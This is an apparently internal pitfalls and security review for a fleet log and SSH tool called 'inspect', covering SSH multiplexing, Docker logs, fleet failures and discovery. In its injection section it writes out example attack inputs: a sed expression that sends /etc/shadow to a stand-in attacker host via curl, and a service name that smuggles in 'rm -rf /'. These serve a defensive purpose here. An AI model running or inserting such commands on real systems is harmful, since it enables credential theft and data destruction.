# Inspect — Real-World Pitfalls & Security Report

**Purpose:** Lessons from production usage of similar tools (stern, kubectl, Ansible, SSH fleet tools, Docker log systems). These are the things that work fine in dev and break in the field. Organized by category, with specific implications for `inspect`.

---

## 1. SSH Multiplexing Will Break in Ways You Don't Expect

### 1.1 MaxSessions limit (the silent wall)

OpenSSH's `sshd_config` has `MaxSessions 10` by default. This limits multiplexed sessions *per TCP connection*. When `inspect` fans out to 12 containers on the same server via ControlMaster, sessions 11 and 12 get **"Session open refused by peer"** — silently, not loudly.

**Impact on inspect:** Fleet operations and multi-container grep across many services on a single server will hit this. A server with 15 Docker containers means 15 parallel `docker logs | rg` invocations — exceeds default MaxSessions.

**Fix:** Detect this at discovery time. Probe `MaxSessions` (if readable) or catch the "refused by peer" error and: (a) retry with sequential execution instead of parallel, (b) warn the user to increase `MaxSessions` on the target, (c) document it in `inspect setup` output.

### 1.2 Stale control sockets after network outage

If the network drops while a ControlMaster is alive, the socket file persists but the TCP connection is dead. Every subsequent `inspect` command tries to reuse the dead socket, gets a hang or timeout, and the user has no idea why.

**Impact on inspect:** After a WiFi reconnect or VPN drop, every command hangs for the SSH timeout duration (default 30s) before failing. Users will think the tool is broken.

**Fix:** Before reusing a socket, run `ssh -O check` equivalent (the `openssh` crate supports this). If the check fails, tear down the stale socket and reconnect transparently. Log a one-line notice: "Reconnected to arte (previous session timed out)."

### 1.3 ControlPersist keeps authenticated sessions open

The bible sets TTL to 4h for Codespaces. That's 4 hours where anyone with access to the socket file (same user, mode 600) can open new SSH sessions without re-authenticating. On a shared machine this is a real exposure window.

**Impact on inspect:** Mostly fine for single-user laptops and Codespaces. On shared CI runners or jump boxes where multiple users share a UID (bad practice, but happens), the socket is an authentication bypass.

**Fix:** Enforce mode 600 (already in spec). Consider adding `inspect connect --ttl 30m` override for sensitive environments. Document that on shared machines, shorter TTL is recommended.

### 1.4 Bulk SCP slows interactive sessions

All multiplexed sessions share one TCP connection. A large `inspect cp` (pushing a 50MB file) will starve concurrent `inspect logs --follow` streams on the same server because they share bandwidth on the same TCP pipe.

**Impact on inspect:** A user pushing a hot-fix file while tailing logs on the same server will see log output stutter or freeze until the copy completes.

**Fix:** Document this. Consider opening a *separate* non-multiplexed connection for large file transfers (`inspect cp` with files above a threshold). Or at minimum warn in the dry-run output: "This file is 50MB; streaming commands to the same server may be affected during transfer."

---

## 2. Docker Logs Are Not What You Think

### 2.1 No rotation by default

Docker's `json-file` driver has **no log rotation by default**. A container running for weeks with verbose logging produces multi-gigabyte log files. When `inspect grep` tries to search those files (even with `--since 1h`), the initial file scan can be slow because Docker must seek through the entire file to find the time boundary.

**Impact on inspect:** `inspect grep "error" arte/chatty-service --since 1h` might take 30 seconds to return first results if the log file is 5GB, even though only the last hour is relevant. Users will think the tool is slow.

**Fix:** At discovery time, check log file sizes and warn: "atlas: log file is 4.2GB, no rotation configured. Searches may be slow. Consider setting max-size in Docker daemon.json." This goes in the `discovery_warnings` field of the profile.

### 2.2 Log truncation breaks `docker logs -f`

If someone (or a cron job) truncates a container's log file with `truncate -s0`, `docker logs -f` silently stops producing output. The stream hangs forever. No error, no EOF, no reconnect.

**Impact on inspect:** `inspect logs arte/pulse --follow` will silently hang after a log rotation event. The user sees no output and assumes the service stopped logging.

**Fix:** When streaming via `docker logs -f` (or direct file read with `--follow`), implement a heartbeat check: if no output for N seconds on a service that was previously producing output, probe the service (`docker inspect` to check it's still running, check log file inode/size). If the file was truncated or rotated, reconnect the stream. Log: "Log stream for arte/pulse was interrupted (file truncated); reconnecting."

### 2.3 Non-json-file log drivers

If a container uses `journald`, `fluentd`, `awslogs`, or `none` as its log driver, `docker logs` may not work at all (returns "logs not available for this driver"), or the logs are elsewhere (journald → `journalctl CONTAINER_NAME=...`).

**Impact on inspect:** `inspect logs` silently fails or returns nothing for containers with non-standard log drivers.

**Fix:** Discovery already detects the log driver (§5). The source reader for logs should dispatch to the right backend: `json-file` → direct file read or `docker logs`; `journald` → `journalctl`; `none`/`fluentd`/`awslogs` → clear error: "Logs for atlas are sent to fluentd, not available locally. Check your central logging system." Never fail silently.

### 2.4 The 16KB line truncation

Docker's logging pipeline truncates individual log lines at 16KB (16,385 characters). If a service outputs large JSON blobs (e.g., a full request/response dump), the log line is silently truncated. The `| json` pipeline stage then fails to parse it.

**Impact on inspect:** `inspect search '{...} | json | status >= 500'` fails with a parse error on truncated lines instead of showing results.

**Fix:** When `| json` parse fails, don't drop the record. Attach an `_parse_error: "truncated JSON at byte 16385"` label and let the pipeline continue. The user can then filter on `_parse_error` to find problematic records.

---

## 3. Remote Command Execution Is a Security Surface

### 3.1 The `edit` sed expression is a shell injection vector

`inspect edit arte/atlas:/etc/atlas.conf 's/old/new/'` executes `sed -i 's/old/new/' /path/to/file` on the remote via SSH. If the sed expression contains shell metacharacters (`;`, `$()`, backticks), they execute in the remote shell.

Example attack: `inspect edit arte/atlas:/etc/foo 's/x/$(curl attacker.com/exfil?data=$(cat /etc/shadow))/g'`

**Impact on inspect:** The tool designed for safe edits becomes a remote code execution vector if sed expressions aren't sanitized.

**Fix:** The sed expression MUST be escaped before being interpolated into the SSH command. Use the Rust `shell_escape` crate or equivalent. Better: pass the sed expression as a here-doc or via stdin rather than as a shell argument. Validate that the expression is a valid `sed` program (basic syntax check) before sending it to the remote. Never interpolate user input directly into a shell command string.

### 3.2 The `exec` verb is inherently dangerous

`inspect exec arte/postgres -- "psql -c 'DROP TABLE users'" --apply` is a valid command. The bible acknowledges this ("cannot reliably classify read-vs-write at parse time") and gates it behind `--apply`, but the dry-run for `exec` can only show "Would run: psql -c 'DROP TABLE users'" — it can't preview the *effect*.

**Impact on inspect:** `exec` is an escape hatch from the safety contract. Users who are comfortable with `--apply` on `restart` (predictable) may be equally casual with `--apply` on `exec` (unpredictable).

**Fix:** Consider a separate `--allow-exec` flag distinct from `--apply`, so the user explicitly opts into arbitrary command execution. Log `exec` invocations with the full command in the audit log. In fleet mode, `exec` should have a lower fanout interlock threshold (e.g., prompt at >3 targets instead of >10).

### 3.3 The `map` stage `$field$` interpolation is an injection vector

`map { {server="arte", service="$service", source=~"file:.*"} |~ "$service" }` interpolates `$service` from the parent stream. If a log line contains a crafted service name like `pulse"; rm -rf /; echo "`, and that value flows into a remote command via the source reader, you get command injection.

**Impact on inspect:** If the `$field$` value is used unsanitized in constructing a remote SSH command (e.g., to select which container to read), a malicious log entry could inject commands.

**Fix:** `$field$` substitution must ONLY affect the LogQL query AST (label values), never shell command strings. The source reader must treat every label value as data, not code. When constructing remote commands (`docker logs <container>`), container names must be validated against the discovered profile — if the interpolated `$service` doesn't match a known service, reject it rather than passing it to the shell.

### 3.4 Audit log tampering

The audit log at `~/.inspect/audit/` is append-only by convention, but it's a regular file owned by the user. A user (or malware running as that user) can edit or delete audit entries to cover their tracks.

**Impact on inspect:** The audit log provides forensics, not tamper-proof accountability.

**Fix:** Document this limitation honestly: "The audit log is forensic, not tamper-proof. For tamper-proof audit trails in regulated environments, forward audit entries to an external log system." Consider adding `inspect audit verify` that checks each entry's internal consistency (hash chain) but acknowledge that a sufficiently motivated attacker can regenerate the chain.

---

## 4. Fleet Operations Have Failure Modes That Scale Nonlinearly

### 4.1 One slow server blocks the batch

If fleet operations wait for all servers in a batch to complete before rendering output, one server with high latency or a hung `docker logs` command blocks the entire batch. Ansible's `linear` strategy has this exact problem.

**Impact on inspect:** `inspect fleet status --ns 'prod-*'` takes 45 seconds instead of 2 seconds because prod-asia has 500ms latency and a slow Docker daemon.

**Fix:** Stream results per server as they arrive. The first server to respond gets rendered immediately. Slow servers show a progress indicator. After a configurable timeout (default 30s), timed-out servers are reported as "timed out" in the summary. Never block all output waiting for the slowest node.

### 4.2 "Too many open files" at scale

Each parallel SSH connection consumes file descriptors on the control node: the socket, the pty, stdout, stderr. With `INSPECT_FLEET_CONCURRENCY=8` and 5 containers per server, you're at 40+ file descriptors. With concurrency 50 on a fleet of 100 servers, you hit `ulimit -n` (typically 1024 default).

**Impact on inspect:** Fleet operations silently fail or produce cryptic "Too many open files" errors on large fleets.

**Fix:** At startup, check `ulimit -n` and warn if `fleet_concurrency * estimated_fds_per_server` approaches the limit. Consider auto-capping concurrency based on available file descriptors. Document the `ulimit -n 65536` recommendation for large fleets.

### 4.3 Partial failures in fleet write verbs

`inspect fleet restart pulse --ns 'prod-*' --apply` restarts pulse on 12 servers. 10 succeed, 2 fail (container not found — maybe those servers use a different name). The exit code is non-zero, but the 10 successful restarts already happened. There's no rollback.

**Impact on inspect:** Partial success in fleet write operations leaves the fleet in an inconsistent state.

**Fix:** Already partly addressed in the bible (best-effort across targets, exit 0 only if all succeed). Additionally: print a clear summary distinguishing successes from failures. For restart operations, consider offering `inspect fleet restart --canary 1` that restarts on one server first, waits for health check, then proceeds to the rest. This is the Ansible `serial: 1` pattern applied to service operations.

---

## 5. Log Streaming Over SSH Has Bandwidth and Buffering Traps

### 5.1 SSH channel buffering delays output

SSH channels buffer output. When a container produces one log line per second, the SSH channel may buffer 4KB before flushing. The user sees no output for several seconds, then a burst of lines. This makes `--follow` feel laggy.

**Impact on inspect:** `inspect logs arte/pulse --follow` feels sluggish compared to running `docker logs -f` directly on the server.

**Fix:** Use `ssh -tt` (force pseudo-tty) for streaming commands to get line-buffered output. Or use `stdbuf -oL` on the remote command to force line buffering. Test this during field testing — it's the kind of thing that varies by OS and SSH version.

### 5.2 Large log searches saturate the SSH connection

`inspect grep "error" 'prod-*' --since 30d` across 10 servers with 30 days of logs can try to pull gigabytes of matching lines over SSH simultaneously. Even with filter pushdown (only matching lines transfer), if "error" matches 5% of all log lines, that's still massive.

**Impact on inspect:** The user's network saturates, SSH connections time out, and partial results appear with errors.

**Fix:** Implement backpressure. If the output buffer exceeds a threshold, slow down the remote readers. For very large result sets, auto-add `--tail 1000` with a warning: "Query returned more than 1000 matches. Showing the most recent 1000. Use --max to increase." Never try to stream unbounded results.

### 5.3 Time synchronization across servers

`--since 1h` means "1 hour before now" — but "now" on which clock? If the remote server's clock is 10 minutes ahead of the local machine, `--since 1h` misses the last 10 minutes of logs. If it's 10 minutes behind, you get 10 minutes of extra logs.

**Impact on inspect:** Cross-server searches produce inconsistent time windows. A timestamp-clustered error that looks like it happened at 14:32 on one server and 14:42 on another might actually be the same event.

**Fix:** At discovery time, record the time offset between local and remote (`date +%s` on both sides, diff). Adjust `--since` and `--until` per server to compensate. Show the offset in `inspect status` output. If the offset exceeds 30 seconds, emit a warning.

---

## 6. Discovery Will Be Incomplete or Wrong

### 6.1 Docker Compose service names vs container names

Docker Compose creates containers with names like `myproject_pulse_1`. The service name in the compose file is `pulse`. `docker ps` shows the container name, not the service name. If discovery uses container names, the user types `arte/myproject_pulse_1` instead of `arte/pulse`.

**Impact on inspect:** Service names in the profile don't match what the user expects.

**Fix:** Discovery should extract the `com.docker.compose.service` label (set by Docker Compose) and use it as the primary service name, with the full container name as a fallback. This is what stern does.

### 6.2 Containers that restart frequently

A container in a crash loop restarts every 30 seconds. Between discovery and a `grep` command, the container ID changes. The cached profile points to a dead container.

**Impact on inspect:** Commands fail with "container not found" on services that are technically running (just with a new ID).

**Fix:** Resolve container references by name/label at command time, not by cached ID. The profile stores the name; the command resolves name → current ID. Already partially handled by the drift check, but the drift check is async — commands should do a synchronous name-to-ID resolution for the target containers.

### 6.3 Non-Docker services

Host services (systemd units, bare-metal processes) don't show up in `docker ps`. A web server running as a systemd unit with logs in `/var/log/nginx/` is invisible to container-focused discovery.

**Impact on inspect:** The user knows nginx is running on the server but `inspect status` doesn't show it.

**Fix:** Already in the spec (systemd discovery, `_` selector for host-level). Make sure this actually works in the field. Many servers have dozens of systemd units; filter to user-facing services (exclude system units like `dbus`, `systemd-*`, `cron`).

---

## 7. Edge Cases That Will Surface in Field Testing

### 7.1 Services that log binary data

Some services write binary data to stdout (e.g., health check responses, protobuf). This breaks line-based parsing, corrupts terminal output, and can trigger terminal escape sequence injection (a minor security issue — crafted log output could manipulate the user's terminal).

**Fix:** Detect non-UTF-8 content and either hex-escape it or skip the line with a marker. Never pass raw binary to the terminal.

### 7.2 Log files with non-standard encodings

Log files in Latin-1, Shift-JIS, or other encodings produce mojibake when treated as UTF-8.

**Fix:** Default to UTF-8 with lossy decoding (replace invalid bytes with `�`). Consider `--encoding` flag for edge cases.

### 7.3 Containers with no shell

Minimal containers (distroless, scratch-based) have no `/bin/sh`. Commands like `docker exec <id> sh -c 'cat /etc/foo'` fail.

**Fix:** Detect this at discovery time (probe for shell availability). Fall back to `docker cp` for file reads when no shell is available. Document the limitation for `exec`.

### 7.4 Symlink loops in directory listings

`inspect ls arte/pulse:/etc/` follows symlinks. A symlink loop causes infinite recursion.

**Fix:** Track visited inodes. Cap directory recursion depth (default 10). Detect and report loops.

### 7.5 Very long log lines

Some services produce log lines that are 100KB+ (e.g., base64-encoded payloads, serialized objects). These blow up memory when buffered and make terminal output unreadable.

**Fix:** Truncate displayed lines at a configurable max (default 4KB) with a `[truncated, full line: 104832 bytes]` suffix. `--json` output preserves the full line.

---

## 8. Summary: What to Test First in the Field

Priority order for field testing against a real server:

1. **SSH reconnection after network drop.** Kill your WiFi mid-stream. Does `inspect` recover?
2. **Large log file search.** Find a container with a multi-GB log file. Does `--since 1h` respond quickly?
3. **Non-json-file log driver.** Do you have any containers using journald or fluentd? Does discovery handle it?
4. **Fleet with one slow/dead server.** Add a non-existent server to your fleet. Does it timeout gracefully?
5. **`edit` with shell metacharacters in the sed expression.** Try `'s/foo/$(whoami)/g'` in dry-run. Does it escape correctly?
6. **Streaming follow with log truncation.** Start `--follow`, then truncate the log file from another terminal. Does the stream recover?
7. **Parallel operations exceeding MaxSessions.** Hit a server with more concurrent operations than `MaxSessions 10`. Is the error clear?
8. **Docker Compose service name resolution.** Are services listed by their compose service name or their container name?
9. **Crash-looping container.** Have a container that restarts every 30 seconds. Can you still grep its logs?
10. **Clock skew between servers.** Deliberately set one server's clock 5 minutes off. Do cross-server searches produce consistent results?
